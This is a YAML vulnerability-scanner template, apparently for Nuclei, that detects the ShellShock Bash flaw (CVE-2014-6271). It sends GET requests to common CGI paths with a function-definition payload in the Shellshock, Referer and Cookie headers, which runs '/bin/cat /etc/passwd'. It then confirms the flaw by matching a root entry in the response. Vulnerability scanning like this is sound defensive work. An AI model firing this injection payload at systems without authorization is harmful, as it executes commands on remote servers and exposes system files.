id: CVE-2014-6271
info:
  name: ShellShock - Remote Code Execution
  author: pentest_swissky,0xelkomy
  severity: critical
  description: CVE-2014-6271, also known as ShellShock, is a vulnerability in GNU
    Bash through version 4.3 that allows remote attackers to execute arbitrary code
    via a crafted environment variable, affecting various systems including OpenSSH
    and Apache HTTP Server.
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2014-6271
  - https://nvd.nist.gov/vuln/detail/CVE-2014-7169
  - http://www.kb.cert.org/vuls/id/252743
  - http://www.us-cert.gov/ncas/alerts/TA14-268A
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2014-6271
    cwe-id: CWE-78
  tags: cve,cve2014,rce,shellshock,kev
  metadata:
    impact: The ShellShock vulnerability had a significant impact as it allowed attackers
      to remotely execute arbitrary code via a crafted environment, affecting various
      systems including OpenSSH, Apache HTTP Server, and DHCP clients.
    recommendation: I highly recommend implementing immediate software patching and
      updating protocols to protect against ShellShock vulnerabilities.
requests:
- method: GET
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/cgi-bin/status'
  - '{{BaseURL}}/cgi-bin/stats'
  - '{{BaseURL}}/cgi-bin/test'
  - '{{BaseURL}}/cgi-bin/status/status.cgi'
  - '{{BaseURL}}/test.cgi'
  - '{{BaseURL}}/debug.cgi'
  - '{{BaseURL}}/cgi-bin/test-cgi'
  headers:
    Shellshock: '() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd '
    Referer: '() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd '
    Cookie: '() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd '
  stop-at-first-match: true
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
